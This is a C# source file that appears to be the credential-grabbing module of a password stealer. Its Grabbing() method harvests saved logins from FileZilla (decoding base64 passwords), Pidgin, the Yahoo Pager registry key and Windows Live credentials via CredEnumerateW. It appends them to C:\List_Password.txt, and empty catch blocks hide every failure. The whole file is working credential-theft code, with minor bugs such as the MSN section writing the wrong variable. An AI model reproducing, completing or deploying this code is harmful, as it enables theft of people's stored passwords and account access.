using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Xml;
using Microsoft.Win32;

static class Menegers
{
    #region Path
    static string sFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + @"\FileZilla\recentservers.xml";
    static string PidginPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\.purple\accounts.xml";
    static string Log = @"C:\List_Password.txt";
    static string sA = null;
    #endregion Path
    public static void Grabbing()
    {
        #region FileZilla
        // FileZilla
        try
        {
            XmlDocument xf = new XmlDocument();
            xf.Load(sFilePath);
            XmlNodeList bb = xf.GetElementsByTagName("RecentServers");
            XmlNodeList bs = ((XmlElement)bb[0]).GetElementsByTagName("Server");
            foreach (XmlElement va in bs)
            {
                XmlNodeList h = va.GetElementsByTagName("Host");
                XmlNodeList p = va.GetElementsByTagName("Port");
                XmlNodeList u = va.GetElementsByTagName("User");
                XmlNodeList ps = va.GetElementsByTagName("Pass");
                sA = string.Format(@"\----------[FileZilla - Manager]----------/" + Environment.NewLine + Environment.NewLine +
                    "Host: {0}\r\nPort: {1}\r\nUser: {2}\r\nPass: {3}\r\n", h[0].InnerText, p[0].InnerText, u[0].InnerText, Encoding.UTF8.GetString(Convert.FromBase64String(ps[0].InnerText)));
                using (FileStream q = new FileStream(Log, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter c = new StreamWriter(q, Encoding.UTF8))
                    {
                        c.WriteLine(sA, true);
                        c.Close();
                    }
                    q.Close();
                }
            }
        }
        catch { }
        #endregion FileZilla
        #region Pidgin
        // Pidgin
        try
        {
            XmlTextReader rd = new XmlTextReader(PidginPath);
            XmlDocument xs = new XmlDocument();
            xs.Load(rd);
            {
                foreach (XmlNode nl in xs.DocumentElement.ChildNodes)
                {
                    XmlNodeList il = nl.ChildNodes;
                    string PRL = il[0].InnerText;
                    string UNM = il[1].InnerText;
                    string PSW = il[2].InnerText;
                    sA = string.Format(@"\----------[Pidgin - Manager]----------/" + Environment.NewLine + Environment.NewLine +
                    "Protocol: {0}\r\nUsername: {1}\r\nPassword: {2}\r\n", PRL, UNM, PSW);
                    using (FileStream w = new FileStream(Log, FileMode.Append, FileAccess.Write))
                    {
                        using (StreamWriter x = new StreamWriter(w, Encoding.UTF8))
                        {
                            x.WriteLine(sA, true);
                            x.Close();
                        }
                        w.Close();
                    }
                }
            }
        }
        catch { }
        #endregion Pidgin
        #region Yahoo
        // Yahoo
        try
        {

            RegistryKey keyYahooPager = Registry.CurrentUser.OpenSubKey("Software\\Yahoo\\Pager");
            string sUserName = (string)keyYahooPager.GetValue("Yahoo! User ID");
            sA = string.Format(@"\----------[Yahoo - Manager]----------/" + Environment.NewLine + Environment.NewLine +
            "URL: http://Yahoo.com " + "\r\nUsername: " + sUserName + "\r\nPassword: Unknown");
            using (FileStream e = new FileStream(Log, FileMode.Append, FileAccess.Write))
            {
                using (StreamWriter z = new StreamWriter(e, Encoding.UTF8))
                {
                    z.WriteLine(sA, true);
                    z.Close();
                }
                e.Close();
            }
        }
        catch { }
        #endregion Yahoo
        #region MSN
        // MSN
        try
        {
            UInt32 num = default(UInt32);
            IntPtr zero = IntPtr.Zero;
            if (CredEnumerateW(("WindowsLive:name=" + "*"), 0, ref num, ref zero))
            {
                int i = 0;
                for (i = 0; i <= num - 1; i++)
                {
                    try
                    {
                        string s = null;
                        CREDENTIAL credential = (CREDENTIAL)Marshal.PtrToStructure(Marshal.ReadIntPtr(zero, (IntPtr.Size * i)), typeof(CREDENTIAL));
                        s = string.Format(@"\----------[MSN - Manager]----------/" + Environment.NewLine + Environment.NewLine +
                        "URL: http://Yahoo.com " + "\r\nUsername: " + credential.UserName + "\r\nPassword: " + Marshal.PtrToStringBSTR(credential.CredentialBlob) +"\r\n");
                        using (FileStream e = new FileStream(Log, FileMode.Append, FileAccess.Write))
                        {
                            using (StreamWriter z = new StreamWriter(e, Encoding.UTF8))
                            {
                                z.WriteLine(sA, true);
                                z.Close();
                            }
                            e.Close();
                        }
                    }
                    catch { }
                }
            }
        }
        catch { }
        #endregion MSN    
    }
    #region Structures
    [StructLayout(LayoutKind.Sequential)]
    internal struct CREDENTIAL
    {
        public int Flags;
        public int Type;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string TargetName;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string Comment;
        public long LastWritten;
        public int CredentialBlobSize;
        public IntPtr CredentialBlob;
        public int Persist;
        public int AttributeCount;
        public IntPtr Attributes;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string TargetAlias;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string UserName;
    }
    #endregion Structures
    #region DLL
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CredEnumerateW(string filter, UInt32 flag, ref UInt32 count, ref IntPtr pCredentials);
    #endregion DLL
}